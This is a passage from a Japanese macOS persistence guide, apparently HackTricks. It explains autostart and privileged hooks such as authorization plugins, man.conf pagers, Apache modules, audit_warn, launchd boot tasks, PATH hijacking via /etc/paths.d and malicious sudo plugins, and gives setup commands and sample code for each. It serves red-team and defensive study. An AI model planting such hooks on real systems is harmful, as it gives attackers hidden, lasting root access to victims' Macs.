最後に、この Plugin を読み込むための**ルール**を追加します：

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** は、認可フレームワークに認可のため外部 mechanism を呼び出す必要があることを伝えます。さらに、**`privileged`** を指定すると root として実行されます。

次の方法でトリガーします：

```bash
security authorize com.asdf.asdf
```

その後、**staffグループにはsudo**アクセス権が必要です（`/etc/sudoers`を読んで確認してください）。

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- sandboxのバイパスに有用: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、root権限が必要で、ユーザーがmanを使う必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/private/etc/man.conf`**
  - root権限が必要
  - **`/private/etc/man.conf`**: manが使われるたび

#### 説明とExploit

設定ファイル **`/private/etc/man.conf`** は、manのドキュメントファイルを開くときに使用するバイナリ／スクリプトを指定します。そのため、実行ファイルのパスを変更すれば、ユーザーがmanでドキュメントを読むたびにバックドアを実行できます。<sup>[[31]](#references)</sup>

たとえば、**`/private/etc/man.conf`** に次のように設定します:

```
MANPAGER /tmp/view
```

そして、次のように `/tmp/view` を作成します:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- sandbox bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、root 権限が必要で、apache が実行中である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd には entitlements がありません

#### 場所

- **`/etc/apache2/httpd.conf`**
  - root 権限が必要
  - トリガー: Apache2 の起動時

#### 説明と Exploit

`/etc/apache2/httpd.conf` に次のような行を追加して、モジュールを読み込むように指定できます:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

この方法で、コンパイルしたモジュールが Apache に読み込まれます。ただし、**有効な Apple certificate で署名する**か、システムに**新しい trusted certificate を追加して、それで署名する**必要があります。

次に、必要であれば、サーバーが起動することを確認するために、次を実行できます。

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Dylbのコード例：

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- sandbox の bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、root 権限が必要で、auditd が実行中であり、警告を発生させる必要がある
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/etc/security/audit_warn`**
  - root 権限が必要
  - **トリガー**: auditd が警告を検出したとき

#### 説明と悪用

auditd が警告を検出すると、スクリプト **`/etc/security/audit_warn`** が**実行**されます。そのため、ここにペイロードを追加できます。<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

`sudo audit -n`で警告を強制的に表示できます。

### 起動項目

> [!CAUTION] > **これは非推奨のため、これらのディレクトリには何も見つからないはずです。**

**StartupItem**は、`/Library/StartupItems/`または`/System/Library/StartupItems/`のいずれかに配置するディレクトリです。このディレクトリには、次の2つのファイルを含める必要があります。

1. **rc script**：起動時に実行されるシェルスクリプト。
2. **plist file**：`StartupParameters.plist`という名前のファイルで、さまざまな設定が含まれています。

起動プロセスがファイルを認識して使用できるように、rc scriptと`StartupParameters.plist`ファイルの両方が**StartupItem**ディレクトリ内に正しく配置されていることを確認してください。

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> 私のmacOSではこのコンポーネントを確認できないため、詳しくはwriteupを参照してください。

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Appleによって導入された**emond**は、開発途上、あるいは放棄された可能性があるものの、現在もアクセス可能なロギング機構です。Macの管理者にとって特に有用ではありませんが、この目立たないサービスは、ほとんどのmacOS管理者に気づかれないまま、脅威アクターがひそかに永続化する手段として使われる可能性があります。<sup>[[34]](#references)</sup>

その存在を知っていれば、**emond**が悪用されているかどうかを特定するのは簡単です。このサービスのシステムのLaunchDaemonは、単一のディレクトリ内に実行するスクリプトがないか探します。これを確認するには、次のコマンドを使用できます。

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### 場所

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - root権限が必要
  - **トリガー**: XQuartzの使用時

#### 説明とExploit

XQuartzは**macOSにはもうインストールされていない**ため、詳細についてはwriteupを確認してください。<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> kextのインストールはroot権限があっても非常に複雑なため、exploitがない限り、実用的なsandbox escapeや永続化の手法とは見なされません。

#### 場所

KEXTをstartup itemとしてインストールするには、**次のいずれかの場所にインストールする必要があります**。

- `/System/Library/Extensions`
  - OS Xオペレーティングシステムに組み込まれたKEXTファイル。
- `/Library/Extensions`
  - サードパーティ製ソフトウェアによってインストールされたKEXTファイル

現在ロードされているkextファイルは、次のコマンドで一覧表示できます。

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### 場所

- **`/usr/local/bin/amstoold`**
  - root権限が必要

#### 説明とExploit

どうやら、`/System/Library/LaunchAgents/com.apple.amstoold.plist` の `plist` は、このバイナリを使いながらXPC serviceを公開していたようです。問題は、このバイナリが存在しなかったことです。そのため、そこに何かを配置すれば、XPC serviceが呼び出されたときにそのバイナリが実行されます。<sup>[[35]](#references)</sup>

現在、私のmacOSではこれを見つけられません。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### 場所

- **`/Library/Preferences/Xsan/.xsanrc`**
  - root権限が必要
  - **実行条件**: サービスが実行されたとき（まれ）

#### 説明とExploit

このスクリプトが実行されることはあまりないようで、私のmacOSでは見つけることすらできませんでした。詳しくはWriteupを確認してください。<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **これは最近のMacOSバージョンでは動作しません**

ここに**起動時に実行されるコマンド**を配置することもできます。通常のrc.commonスクリプトの例:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchdのブートタスク

解説: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- sandboxのバイパスに有用: [🔴](https://emojipedia.org/large-red-circle) (rootが必要)
- rootが必要。さらにパスに応じて、**SIP bypass**または**`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access権限が必要

#### 場所

`launchd`は、初期の「ブートタスク」を記述したplistを**`__TEXT,__config`**セクションに埋め込んでいます。いくつかの参照スクリプト/バイナリはデフォルトでは存在せず、攻撃者が作成できます:

- SIP-bypassセット: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDAセット: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot`はSequoia以降でのみ既存)

#### 説明と悪用

埋め込まれたタスクテーブルをダンプすると、`launchd`が実行するファイルと、サポートされているキー (`Program`、`ProgramArguments`、`PerformAfterUserspaceReboot`、`RequireSuccess`など)を確認できます:

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

参照されているファイル（例: `/etc/rc.server`）を作成すると、次回の（userspace）再起動時に `launchd` がそのファイルを実行します。最も有用なエントリは SIP によって制限されるか、TCC の SysAdminFiles/Full Disk Access が必要なため、これは root レベルの再起動トリガー型テクニックです。<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

解説: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

`rc.trampoline` の boot task は、起動時に `apple-trusted-trampoline` NVRAM 変数に保存された**platform（Apple 署名済み）バイナリ**を実行します。ただし、これは**`rc.trampoline=1` の boot-arg が設定され、SIP が無効になっている場合に限ります**（サイズ上限は約 390&nbsp;KB で、ブロッキング／即時リターンの制約もあります）。**root + SIP 無効化 + Apple 署名済みペイロード**が必要なため、実環境での persistence には実質的に利用できず、完全性のためにのみここに記載しています。<sup>[[41]](#references)</sup>

### /etc/paths and /etc/paths.d (PATH hijack)

- sandbox のバイパスに有用: [🔴](https://emojipedia.org/large-red-circle) (書き込みには root が必要)
- root が必要

#### 場所

- **`/etc/paths`** および **`/etc/paths.d/*`** — `path_helper`（`/etc/zprofile` から呼び出される）が読み込み、ログイン時のデフォルト `PATH` を構築します。

#### 説明と悪用

どちらも root 所有です。攻撃者が制御するディレクトリを先頭に追加する（`/etc/paths` を編集するか、`/etc/paths.d/` にファイルを配置する）と、そのディレクトリが新しいログインシェルすべての `PATH` の前方に現れます。そのため、一般的なコマンド（`ls`、`git`、…）と同じ名前の悪意あるバイナリが本物を**シャドウし**、被害者が次にそのコマンドを実行したときに起動します。

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

解説: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- sandboxのbypassに有用: [🔴](https://emojipedia.org/large-red-circle) (rootが必要)
- rootが必要。結果として**SIPをbypass**する。影響を受けるmacOSは**15.0–15.1**、**15.2**で修正済み

#### 場所

- **`/Library/Filesystems/`**にfilesystem bundleを配置する。

#### 説明と悪用

`storagekitd`はentitlement **`com.apple.rootless.install.heritable`**を持ち、filesystem bundleのバイナリをSIP-bypassing capabilityを**継承**した状態で起動する。悪意のあるfilesystem bundleを配置することで、攻撃者はSIP bypassを使ってコードを実行し、**永続的なkernel extension**をインストールしたり、SIPで保護された`LaunchDaemon`ディレクトリに書き込んだりできる。これは通常の保護を回避し、それを無効化する永続化手段となる。<sup>[[46]](#references)</sup> AppleはmacOS Sequoia 15.2で修正した。

### sudo plugins (/etc/sudo.conf)

解説: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- sandboxのbypassに有用: [🔴](https://emojipedia.org/large-red-circle) (`/etc/sudo.conf`への書き込みにrootが必要)
- インストールにはrootが必要。その後、pluginは**すべての`sudo`実行時**に実行される (setuid-rootコンテキスト)

#### 場所

- **`/etc/sudo.conf`** — `Plugin`行は**`/usr/libexec/sudo/`** (または絶対パス)からshared objectを読み込む。デフォルトでは存在しない (sudoは組み込みのpolicyを使用する) ため、作成すればクリーンなhookとなる。

#### 説明と悪用

`sudo`は`/etc/sudo.conf`からpolicy/approval/audit pluginsを読み込む。`sudo`はsetuid-rootであるため、悪意のあるshared-object pluginは、ユーザーが`sudo`を実行するたびに**root権限**で実行される。各sudoコマンドも確認できる、持続性の高いroot persistenceとなる。<sup>[[51]](#references)</sup> macOSに付属するsudo 1.9.xはplugin APIに対応している。

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

解説: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
最小例: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **レガシー機構:** macOS 12.3以降では非推奨です。macOS 14.1以降では、デフォルトでレガシー video plug-ins が無効になっています。この方法を使うには、ユーザーがRecoveryからレガシー video support を復元する必要があります。書き込み可能なディレクトリがあるだけでは不十分です。[Appleの最新サポートガイダンス](https://support.apple.com/en-us/108387)を参照してください。
- plug-in directory への書き込みにはrootが必要です。コード実行は、DAL plug-insを引き続き読み込む互換性のあるクライアントがある場合に限られます。macOS 26では実行時テストを行っていません。

#### 場所

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - rootが必要
  - **トリガー:** 互換性のあるカメラクライアントが、**レガシーsupportの復元後に**デバイスを列挙します。クライアントのlibrary validationによって、サードパーティーのplug-inがブロックされる場合があります。

#### 説明と悪用

CoreMediaIO **DAL**（Device Abstraction Layer）plug-insは、一部のカメラアプリケーションによってプロセス内で読み込まれていました。Appleの[カメラ拡張機能に関するプレゼンテーション](https://developer.apple.com/videos/play/wwdc2022/10022/)では、レガシーDAL plug-insはFaceTime、QuickTime Player、Photo Boothでは**動作せず**、ほかの多くのクライアントではlibrary validationが適用されると明記されています。最新の[Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio)は、別のインストールおよび承認モデルでプロセス外実行されます。過去のプロセス内実行の手法は、現在のmacOSで一般的なCamera TCC bypassが可能であることを意味しません。<sup>[[53]](#references)[[54]](#references)</sup>

macOS 26で読み取り専用の確認を行ったところ、`/Library/CoreMediaIO/Plug-Ins/DAL`は存在し、root所有でした。レガシーsupportの有効化も、クライアントによる読み込みも確認していません。

### Directory Service Plugins

解説: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **レガシーかつ条件付きの機構:** インストールにはroot権限が必要で、実際に設定され、読み込まれるplug-inが必要です。DirectoryServiceのplug-in APIは非推奨です。これを起動時のトリガーとみなす前に、対象MacのOpen Directory設定を確認してください。

#### 場所

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - rootが必要
  - **トリガー:** Open Directoryが必要とした際に、`dspluginhelperd`が対象の設定済みplug-inを読み込みます。[Appleのplug-inランタイムガイド](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html)によると、起動時に読み込むよう設定されていないplug-insは、ノードが開かれたときに遅延読み込みされる場合があります。

#### 説明と悪用

`dspluginhelperd`は、レガシーDirectoryService plug-in bundlesをサポートしています。悪意あるplug-inは、レガシーplug-inが受け入れられ、有効化された場合に、PAMやAuthorization Pluginsとは異なる特権実行経路となる可能性があります。このディレクトリが存在するからといって、新たに書き込んだplug-inが次回起動時に実行されるとは限りません。macOS 26.5のAppleのローカルマニュアル`dspluginhelperd(8)`と`opendirectoryd(8)`には、現在もhelperとこのレガシー経路が記載されています。<sup>[[53]](#references)</sup>

macOS 26で読み取り専用の確認を行ったところ、`/Library/DirectoryServices/PlugIns`と`/usr/libexec/dspluginhelperd`は存在していました。このテストでは、plug-inのインストール、設定、読み込みは行っていません。

## Persistence techniques and tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025年、Infostealerの年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [従来のLaunchAgentsを超えて - 1 - shellの起動ファイル](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [従来のLaunchAgentsを超えて - 18 - X11とXQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [従来のLaunchAgentsを超えて - 21 - 再オープンされるアプリケーション](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [従来のLaunchAgentsを超えて - 20 - Terminalの設定](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [従来のLaunchAgentsを超えて - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [従来のLaunchAgentsを超えて - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [従来のLaunchAgentsを超えて - 22 - LoginHookとLogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [従来のLaunchAgentsを超えて - 4 - cron jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [従来のLaunchAgentsを超えて - 2 - iTerm2の起動](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [従来のLaunchAgentsを超えて - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [従来のLaunchAgentsを超えて - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [従来のLaunchAgentsを超えて - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [従来のLaunchAgentsを超えて - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [従来のLaunchAgentsを超えて - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [従来のLaunchAgentsを超えて - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOSのPersistenceにおけるFolder Actions (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [従来のLaunchAgentsを超えて - 27 - Dock shortcuts](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [従来のLaunchAgentsを超えて - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [従来のLaunchAgentsを超えて - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] ["Mac File Opener"のPersistenceを分析する (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [従来のLaunchAgentsを超えて - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [アクセスを維持する: macOSのPersistenceにおけるScreensavers (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [従来のLaunchAgentsを超えて - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [従来のLaunchAgentsを超えて - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [従来のLaunchAgentsを超えて - 19 - Periodic Scripts](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [従来のLaunchAgentsを超えて - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [従来のLaunchAgentsを超えて - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization Pluginsによる永続的な認証情報の窃取 (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [従来のLaunchAgentsを超えて - 30 - manの設定ファイル - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [従来のLaunchAgentsを超えて - 25 - Apache2 modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [従来のLaunchAgentsを超えて - 31 - BSM audit framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [従来のLaunchAgentsを超えて - 23 - emond、Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [従来のLaunchAgentsを超えて - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [従来のLaunchAgentsを超えて - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [従来のLaunchAgentsを超えて - 10 - アプリケーションのスクリプトファイル](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [従来のLaunchAgentsを超えて - 32 - Dock Tile Plugins](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [従来のLaunchAgentsを超えて - 33 - Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [従来のLaunchAgentsを超えて - 34 - launchdの起動タスク](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [従来のLaunchAgentsを超えて - 35 - NVRAMを介したPersistence (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [OS XでのPersistenceにemailを利用する (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Apple Mailのルールplistに対する不審な変更 (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [悪意あるProfiles - Macにとって最も深刻な脅威の一つ (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [The Art of Mac Malware Vol.1 - Ch.0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [CVE-2024-44243の分析: kernel extensionsを介したmacOS SIP bypass (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [Claude Codeのプロジェクトファイルを介したRCEとAPI Tokenの窃取 (CVE-2025-59536、Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [GitHub CopilotとCursorの新たな脆弱性 - Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - 代替インストール方法 (External Extensions)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [MacのChromeでExtensionInstallForcelistを削除する (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Sudo Pluginsの作成について (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [カスタムURL Schemesを介したRemote Mac Exploitation (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [plug-insを悪用した2つのmacOS persistence手法 (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO DALの最小例 (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: SpotlightベースのmacOS TCC vulnerabilityを分析する (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Python `site` moduleのドキュメント (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [SpotlightからApple Intelligenceへ — 0dayを悪用し、macOS AIを支えるデータを窃取する](https://objective-see.org/blog/blog_0x81.html)
- [58] [PEP 829 — Package Startup Configuration Files](https://peps.python.org/pep-0829/)
- [59] [Python 3.15 `site`のドキュメント — 起動時のエントリーポイント](https://docs.python.org/3.15/library/site.html)
- [60] [autorun-audit — PEP 829と`.start`ファイル](https://github.com/ag3ntsc4rn/autorun-audit)
{{#include ../banners/hacktricks-training.md}}
